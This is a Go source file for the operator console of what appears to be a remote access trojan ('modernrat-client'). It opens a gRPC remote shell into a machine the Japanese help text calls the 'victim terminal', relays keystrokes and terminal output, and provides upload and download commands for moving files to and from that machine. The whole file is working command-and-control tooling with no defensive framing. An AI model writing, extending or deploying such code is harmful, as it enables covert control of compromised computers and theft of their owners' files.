package main

import (
	"context"
	"errors"
	"fmt"
	"io"
	"log"
	"os"
	"os/signal"
	"path/filepath"
	"sort"
	"strings"
	"sync"
	"syscall"
	"unicode"

	pb "modernrat-client/gen"

	"github.com/chzyer/readline"
	"golang.org/x/term"
	"google.golang.org/grpc/metadata"
)

type adminSession struct {
	stream    pb.RemoteShellService_AdminShellClient
	userID    string
	sessionID string
	app       *adminApp

	termState *term.State
	rawMode   bool

	ctx        context.Context
	cancel     context.CancelFunc
	sendMu     sync.Mutex
	sendClosed bool
	sigCh      chan os.Signal

	ttyIn   *os.File
	ttyFD   int
	stdinWG sync.WaitGroup

	closed sync.Once
}

func (a *adminApp) runShell(userID string) error {
	md := metadata.New(map[string]string{"authorization": "Bearer " + a.token})
	ctxWithToken := metadata.NewOutgoingContext(a.ctx, md)

	stream, err := a.shellClient.AdminShell(ctxWithToken)
	if err != nil {
		return fmt.Errorf("AdminShell ストリーム開始失敗: %w", err)
	}
	session := newAdminSession(a, ctxWithToken, stream, userID)
	defer session.close()

	cols, rows := int32(0), int32(0)
	if w, h, err := term.GetSize(int(os.Stdout.Fd())); err == nil {
		cols, rows = int32(w), int32(h)
	}

	openMsg := &pb.ShellMessage{
		Type:   pb.ShellMessageType_SHELL_MESSAGE_TYPE_OPEN,
		UserId: userID,
		Text:   "admin shell request",
		Cols:   cols,
		Rows:   rows,
	}
	if err := session.safeSend(openMsg); err != nil {
		return fmt.Errorf("OPEN 送信失敗: %w", err)
	}

	return session.receiveLoop()
}

func (s *adminSession) receiveLoop() error {
	readerStarted := false
	resizeWatcherStarted := false
	instructionsShown := false

	for {
		msg, err := s.stream.Recv()
		if err != nil {
			if errors.Is(err, io.EOF) {
				return nil
			}
			return fmt.Errorf("AdminShell 受信エラー: %w", err)
		}

		switch msg.GetType() {
		case pb.ShellMessageType_SHELL_MESSAGE_TYPE_OPEN:
			s.sessionID = msg.GetSessionId()
			log.Printf("セッション開始: session=%s", s.sessionID)

		case pb.ShellMessageType_SHELL_MESSAGE_TYPE_ACCEPTED:
			if msg.GetSessionId() != "" {
				s.sessionID = msg.GetSessionId()
			}
			log.Printf("クライアントがシェルを開始しました (session=%s)", s.sessionID)

			if !readerStarted {
				readerStarted = true
				if err := s.enableRawMode(); err != nil {
					log.Printf("警告: raw mode 設定に失敗しました: %v", err)
				}
				s.stdinWG.Add(1)
				go func(sessionID string) {
					defer s.stdinWG.Done()
					if err := s.stdinLoop(sessionID); err != nil {
						if !errors.Is(err, io.EOF) {
							log.Printf("STDIN 送信エラー: %v", err)
						}
						s.closeSession("stdin error")
					}
				}(s.sessionID)
			}

			if !resizeWatcherStarted {
				resizeWatcherStarted = true
				go s.watchResize()
			}

			if !instructionsShown {
				instructionsShown = true
				fmt.Fprintf(os.Stderr, "\r\n%s 行頭で ':' を入力するとローカルコマンド (upload/download) を実行できます。\n", uiColors.wrap(uiColors.accent, "[local]"))
			}

		case pb.ShellMessageType_SHELL_MESSAGE_TYPE_STDOUT:
			if _, err := os.Stdout.Write(msg.GetData()); err != nil {
				return fmt.Errorf("STDOUT 書き込みに失敗: %w", err)
			}

		case pb.ShellMessageType_SHELL_MESSAGE_TYPE_STDERR:
			if _, err := os.Stderr.Write(msg.GetData()); err != nil {
				return fmt.Errorf("STDERR 書き込みに失敗: %w", err)
			}

		case pb.ShellMessageType_SHELL_MESSAGE_TYPE_ERROR:
			return fmt.Errorf("セッションエラー: %s", msg.GetText())

		case pb.ShellMessageType_SHELL_MESSAGE_TYPE_CLOSE:
			fmt.Fprintf(os.Stderr, "\n[session closed] exit_code=%d reason=%s\n", msg.GetExitCode(), msg.GetText())
			return nil

		default:
			log.Printf("未知のメッセージタイプ: %v", msg.GetType())
		}
	}
}

func (s *adminSession) watchResize() {
	if s.sessionID == "" {
		return
	}

	s.sigCh = make(chan os.Signal, 1)
	signal.Notify(s.sigCh, syscall.SIGWINCH)
	defer func() {
		signal.Stop(s.sigCh)
		close(s.sigCh)
	}()

	sendSize := func() {
		w, h, err := term.GetSize(int(os.Stdout.Fd()))
		if err != nil || w <= 0 || h <= 0 {
			return
		}
		_ = s.safeSend(&pb.ShellMessage{
			Type:      pb.ShellMessageType_SHELL_MESSAGE_TYPE_RESIZE,
			SessionId: s.sessionID,
			UserId:    s.userID,
			Cols:      int32(w),
			Rows:      int32(h),
		})
	}

	sendSize()

	for {
		select {
		case <-s.ctx.Done():
			return
		case _, ok := <-s.sigCh:
			if !ok {
				return
			}
			sendSize()
		}
	}
}

func (s *adminSession) stdinLoop(sessionID string) error {
	if sessionID == "" {
		return errors.New("session id not initialized")
	}

	reader := s.inputFile()
	buf := make([]byte, 4096)
	var remoteBuf []byte
	// Track "visible" typed chars to detect ':' at logical line start
	lineBuf := make([]byte, 0, 128)
	lineHasNonSpace := false

	// Escape sequence capture for correct pass-through and selective filtering
	type escType int
	const (
		escNone escType = iota
		escCSI
		escOSC
		escSS3
	)
	inEscape := false
	curEscType := escNone
	escSeq := make([]byte, 0, 64) // buffer for a single escape sequence

	flushRemote := func() error {
		if len(remoteBuf) == 0 {
			return nil
		}
		chunk := append([]byte(nil), remoteBuf...)
		remoteBuf = remoteBuf[:0]
		if sendErr := s.safeSend(&pb.ShellMessage{
			Type:      pb.ShellMessageType_SHELL_MESSAGE_TYPE_STDIN,
			SessionId: sessionID,
			UserId:    s.userID,
			Data:      chunk,
		}); sendErr != nil {
			return sendErr
		}
		return nil
	}

	for {
		select {
		case <-s.ctx.Done():
			return nil
		default:
		}

		n, err := reader.Read(buf)
		if n > 0 {
			for i := 0; i < n; i++ {
				b := buf[i]
				// Escape sequence capture state machine (pass-through, with filtering)
				if !inEscape {
					if b == 0x1b { // ESC
						inEscape = true
						curEscType = escNone
						escSeq = escSeq[:0]
						escSeq = append(escSeq, b)
						continue
					}
				} else {
					// already in escape: accumulate and detect termination
					escSeq = append(escSeq, b)
					if len(escSeq) == 2 && b == '[' {
						curEscType = escCSI
						continue
					}
					if len(escSeq) == 2 && b == ']' {
						curEscType = escOSC
						continue
					}
					if len(escSeq) == 2 && b == 'O' {
						curEscType = escSS3
						// SS3 typically ends on this char or after one more; forward as-is
						// Treat next byte (if any) as part of the sequence then finish
						// We'll terminate on next iteration if printable
					}

					switch curEscType {
					case escCSI:
						// CSI ends when final byte in 0x40..0x7E appears
						if b >= 0x40 && b <= 0x7e {
							// Selectively DROP focus in/out reports: ESC [ ... I / ESC [ ... O
							drop := false
							if len(escSeq) >= 3 && escSeq[0] == 0x1b && escSeq[1] == '[' {
								final := escSeq[len(escSeq)-1]
								if final == 'I' || final == 'O' {
									drop = true
									for _, c := range escSeq[2 : len(escSeq)-1] {
										if (c >= '0' && c <= '9') || c == ';' || c == '?' {
											continue
										}
										drop = false
										break
									}
								}
							}
							if !drop {
								remoteBuf = append(remoteBuf, escSeq...)
							}
							inEscape = false
							curEscType = escNone
							escSeq = escSeq[:0]
						}
						continue
					case escOSC:
						// OSC ends on BEL or ESC \
						if b == 0x07 { // BEL
							remoteBuf = append(remoteBuf, escSeq...)
							inEscape = false
							curEscType = escNone
							escSeq = escSeq[:0]
						} else if b == 0x1b {
							// may be ESC \
							// leave accumulation; check next byte on next iteration
						} else if len(escSeq) >= 2 && escSeq[len(escSeq)-2] == 0x1b && b == '\\' {
							remoteBuf = append(remoteBuf, escSeq...)
							inEscape = false
							curEscType = escNone
							escSeq = escSeq[:0]
						}
						continue
					case escSS3:
						// SS3 sequences are short; when third byte arrives, forward and end
						if len(escSeq) >= 3 {
							remoteBuf = append(remoteBuf, escSeq...)
							inEscape = false
							curEscType = escNone
							escSeq = escSeq[:0]
						}
						continue
					default:
						// Unknown escape: if grows too large, flush defensively
						if len(escSeq) > cap(escSeq)-4 {
							remoteBuf = append(remoteBuf, escSeq...)
							inEscape = false
							curEscType = escNone
							escSeq = escSeq[:0]
						}
						continue
					}
				}

				// At logical line start, ':' enters local mode (ignore escapes and control chars)
				if !lineHasNonSpace && len(lineBuf) == 0 && b == ':' {
					if err := flushRemote(); err != nil {
						return err
					}
					if err := s.handleLocalCommandMode(sessionID); err != nil {
						if errors.Is(err, context.Canceled) {
							return err
						}
						if err != nil {
							fmt.Fprintf(os.Stderr, "%s %v\n", uiColors.wrap(uiColors.error, "ローカルコマンドエラー:"), err)
						}
					}
					lineBuf = lineBuf[:0]
					lineHasNonSpace = false
					continue
				}

				// Forward raw byte
				remoteBuf = append(remoteBuf, b)
				// Maintain simple "visible" line buffer
				if b == '\n' || b == '\r' {
					lineBuf = lineBuf[:0]
					lineHasNonSpace = false
				} else {
					lineBuf = append(lineBuf, b)
					if b != ' ' && b != '\t' {
						lineHasNonSpace = true
					}
				}
			}
			if err := flushRemote(); err != nil {
				return err
			}
		}

		if err != nil {
			if errors.Is(err, io.EOF) {
				_ = flushRemote()
				return s.safeSend(&pb.ShellMessage{
					Type:      pb.ShellMessageType_SHELL_MESSAGE_TYPE_CLOSE,
					SessionId: sessionID,
					UserId:    s.userID,
					Text:      "stdin closed",
				})
			}
			if errors.Is(err, os.ErrClosed) {
				return nil
			}
			return err
		}
	}
}

func (s *adminSession) handleLocalCommandMode(sessionID string) error {
	fmt.Fprintf(os.Stdout, "\r\n%s upload/download コマンドを使用できます。空行で終了します。\n", uiColors.wrap(uiColors.accent, "[local mode]"))

	wasRaw := s.rawMode
	if wasRaw {
		s.restoreTerminal()
	}

	defer func() {
		if wasRaw {
			if err := s.enableRawMode(); err != nil {
				log.Printf("警告: raw mode の再設定に失敗しました: %v", err)
			}
		}
	}()

	completer := newDynamicAutoCompleter(func(line string) []string {
		return s.localCommandSuggestions(line)
	})

	rl, err := readline.NewEx(&readline.Config{
		Prompt:          "local> ",
		AutoComplete:    completer,
		InterruptPrompt: "^C",
		HistoryLimit:    256,
	})
	if err != nil {
		return err
	}
	defer rl.Close()

	var exitLinePrinted bool
	for {
		if err := s.ctx.Err(); err != nil {
			return err
		}

		line, err := rl.Readline()
		if err != nil {
			if errors.Is(err, io.EOF) || err == readline.ErrInterrupt {
				fmt.Fprintln(os.Stdout)
				exitLinePrinted = true
				break
			}
			return err
		}

		line = strings.TrimSpace(line)
		if line == "" {
			break
		}
		if strings.EqualFold(line, "exit") || strings.EqualFold(line, "quit") {
			break
		}
		if strings.EqualFold(line, "help") {
			s.printLocalHelp()
			continue
		}

		if err := s.executeLocalCommand(line); err != nil {
			fmt.Fprintf(os.Stderr, "エラー: %v\n", err)
			continue
		}

		rl.SaveHistory(line)
	}

	if !exitLinePrinted {
		fmt.Fprintln(os.Stdout)
	}

	return s.safeSend(&pb.ShellMessage{
		Type:      pb.ShellMessageType_SHELL_MESSAGE_TYPE_STDIN,
		SessionId: sessionID,
		UserId:    s.userID,
		Data:      []byte("\r"),
	})
}

func (s *adminSession) printLocalHelp() {
	fmt.Println(uiColors.wrap(uiColors.accent, "利用可能なローカルコマンド:"))
	fmt.Printf("  %-28s %s\n", uiColors.wrap(uiColors.accent, "upload <local> [remote]"), "ローカルファイルを被害端末へ送信")
	fmt.Printf("  %-28s %s\n", uiColors.wrap(uiColors.accent, "download <remote> [local]"), "被害端末からローカルに保存")
	fmt.Printf("  %-28s %s\n", uiColors.wrap(uiColors.accent, "help"), "このヘルプを表示")
	fmt.Printf("  %-28s %s\n", uiColors.wrap(uiColors.accent, "exit"), "ローカルモードを終了")
}

func (s *adminSession) executeLocalCommand(line string) error {
	args, err := parseArguments(line)
	if err != nil {
		return err
	}
	if len(args) == 0 {
		return nil
	}

	if s.app == nil {
		return errors.New("admin app が初期化されていません")
	}

	switch strings.ToLower(args[0]) {
	case "upload":
		if len(args) < 2 {
			return errors.New("使用方法: upload <local_path> [remote_path]")
		}
		localPath, err := expandLocalPath(args[1])
		if err != nil {
			return err
		}
		remotePath := ""
		if len(args) >= 3 {
			remotePath = args[2]
		}
		if remotePath == "" {
			remotePath = filepath.Base(localPath)
		}
		fmt.Fprintf(os.Stdout, "%s uploading %s -> %s\n", uiColors.wrap(uiColors.accent, "[local]"), localPath, remotePath)
		if err := s.app.performUpload(s.userID, localPath, remotePath); err != nil {
			return err
		}
		fmt.Fprintln(os.Stdout, uiColors.wrap(uiColors.success, "[local] upload complete"))

	case "download":
		if len(args) < 2 {
			return errors.New("使用方法: download <remote_path> [local_path]")
		}
		remotePath := args[1]
		localPath := ""
		if len(args) >= 3 {
			localPath = args[2]
		}
		if localPath == "" {
			localPath = filepath.Base(remotePath)
		}
		localPath, err := expandLocalPath(localPath)
		if err != nil {
			return err
		}
		fmt.Fprintf(os.Stdout, "%s downloading %s -> %s\n", uiColors.wrap(uiColors.accent, "[local]"), remotePath, localPath)
		if err := s.app.performDownload(s.userID, remotePath, localPath); err != nil {
			return err
		}
		fmt.Fprintln(os.Stdout, uiColors.wrap(uiColors.success, "[local] download complete"))

	default:
		return fmt.Errorf("未知のローカルコマンドです: %s", args[0])
	}

	s.app.attachedUser = s.userID
	s.app.defaultUser = s.userID
	return nil
}

func (s *adminSession) localCommandSuggestions(line string) []string {
	commands := []string{"upload ", "download ", "help", "exit"}
	trimmed := line
	hasTrailingSpace := len(trimmed) > 0 && unicode.IsSpace(rune(trimmed[len(trimmed)-1]))
	fields := strings.Fields(trimmed)

	if len(fields) == 0 {
		if hasTrailingSpace {
			return nil
		}
		return commands
	}

	cmd := fields[0]
	if len(fields) == 1 && !hasTrailingSpace {
		var matches []string
		for _, c := range commands {
			candidate := strings.TrimSpace(c)
			if strings.HasPrefix(candidate, cmd) {
				matches = append(matches, c)
			}
		}
		return matches
	}

	argIndex := len(fields) - 1
	currentToken := fields[len(fields)-1]
	prefix := trimmed[:len(trimmed)-len(currentToken)]
	if hasTrailingSpace {
		argIndex++
		currentToken = ""
		prefix = trimmed
	}

	switch strings.ToLower(cmd) {
	case "upload":
		if argIndex == 1 {
			return prependPrefix(prefix, pathCompletionCandidates(currentToken))
		}
	case "download":
		if argIndex == 2 {
			return prependPrefix(prefix, pathCompletionCandidates(currentToken))
		}
	}

	return nil
}

func prependPrefix(prefix string, tokens []string) []string {
	if len(tokens) == 0 {
		return nil
	}
	results := make([]string, 0, len(tokens))
	for _, tok := range tokens {
		results = append(results, prefix+tok)
	}
	return results
}

func pathCompletionCandidates(token string) []string {
	dirPart, partial := filepath.Split(token)
	searchDir := dirPart
	if searchDir == "" {
		searchDir = "."
	}

	expandedDir, err := expandLocalPath(searchDir)
	if err != nil {
		return nil
	}
	if expandedDir == "" {
		expandedDir = "."
	}

	entries, err := os.ReadDir(expandedDir)
	if err != nil {
		return nil
	}

	candidates := make([]string, 0, len(entries))
	for _, entry := range entries {
		name := entry.Name()
		if partial != "" && !strings.HasPrefix(name, partial) {
			continue
		}
		candidate := dirPart + name
		if entry.IsDir() {
			candidate += string(os.PathSeparator)
		}
		candidates = append(candidates, candidate)
	}

	sort.Strings(candidates)
	return candidates
}

func (s *adminSession) closeSession(reason string) {
	s.closed.Do(func() {
		if s.sessionID == "" {
			return
		}
		_ = s.safeSend(&pb.ShellMessage{
			Type:      pb.ShellMessageType_SHELL_MESSAGE_TYPE_CLOSE,
			SessionId: s.sessionID,
			UserId:    s.userID,
			Text:      reason,
		})
	})
}

func (s *adminSession) enableRawMode() error {
	fd := s.ensureTTY()
	if fd == 0 || !term.IsTerminal(fd) {
		return nil
	}

	state, err := term.MakeRaw(fd)
	if err != nil {
		return err
	}
	s.termState = state
	s.rawMode = true

	// Explicitly disable xterm focus reporting to avoid stray CSI I/O sequences
	if s.ttyIn != nil {
		_, _ = s.ttyIn.Write([]byte(disableFocusSeq))
	} else {
		fmt.Fprint(os.Stdout, disableFocusSeq)
	}
	return nil
}

func (s *adminSession) restoreTerminal() {
	if !s.rawMode {
		return
	}

	fd := s.ttyFD
	if fd == 0 {
		fd = int(os.Stdin.Fd())
	}
	if s.termState != nil {
		if err := term.Restore(fd, s.termState); err != nil {
			log.Printf("警告: 端末状態の復元に失敗しました: %v", err)
		}
	}

	s.rawMode = false
	fmt.Fprint(os.Stderr, "\r\n")
}

func newAdminSession(app *adminApp, parent context.Context, stream pb.RemoteShellService_AdminShellClient, userID string) *adminSession {
	ctx, cancel := context.WithCancel(parent)
	return &adminSession{
		stream: stream,
		userID: userID,
		app:    app,
		ctx:    ctx,
		cancel: cancel,
	}
}

func (s *adminSession) safeSend(msg *pb.ShellMessage) error {
	s.sendMu.Lock()
	if s.sendClosed {
		s.sendMu.Unlock()
		return io.EOF
	}

	err := s.stream.Send(msg)
	if err != nil {
		s.sendClosed = true
	}
	s.sendMu.Unlock()

	if err != nil && s.cancel != nil {
		s.cancel()
	}

	return err
}

func (s *adminSession) close() {
	s.sendMu.Lock()
	if s.sendClosed {
		s.sendMu.Unlock()
		return
	}
	s.sendClosed = true
	s.sendMu.Unlock()

	if s.sigCh != nil {
		signal.Stop(s.sigCh)
	}
	if s.ttyIn != nil {
		_ = s.ttyIn.Close()
		s.ttyIn = nil
	}
	if s.cancel != nil {
		s.cancel()
	}
	_ = s.stream.CloseSend()
	s.restoreTerminal()
	s.stdinWG.Wait()
}

func (s *adminSession) ensureTTY() int {
	if s.ttyFD != 0 {
		return s.ttyFD
	}
	if tty, err := os.OpenFile("/dev/tty", os.O_RDWR, 0); err == nil {
		s.ttyIn = tty
		s.ttyFD = int(tty.Fd())
		return s.ttyFD
	}
	s.ttyFD = int(os.Stdin.Fd())
	return s.ttyFD
}

func (s *adminSession) inputFile() *os.File {
	if s.ensureTTY() != 0 && s.ttyIn != nil {
		return s.ttyIn
	}
	return os.Stdin
}

type dynamicAutoCompleter struct {
	handler func(string) []string
}

func newDynamicAutoCompleter(handler func(string) []string) readline.AutoCompleter {
	if handler == nil {
		return nil
	}
	return &dynamicAutoCompleter{handler: handler}
}

func (d *dynamicAutoCompleter) Do(line []rune, pos int) ([][]rune, int) {
	if d == nil || d.handler == nil {
		return nil, 0
	}
	if pos < 0 {
		pos = 0
	}
	if pos > len(line) {
		pos = len(line)
	}
	prefix := string(line[:pos])
	suggestions := d.handler(prefix)
	if len(suggestions) == 0 {
		return nil, 0
	}
	start := pos
	for start > 0 && !unicode.IsSpace(line[start-1]) {
		start--
	}
	replaceLen := pos - start
	results := make([][]rune, len(suggestions))
	for i, suggestion := range suggestions {
		results[i] = []rune(suggestion)
	}
	return results, replaceLen
}
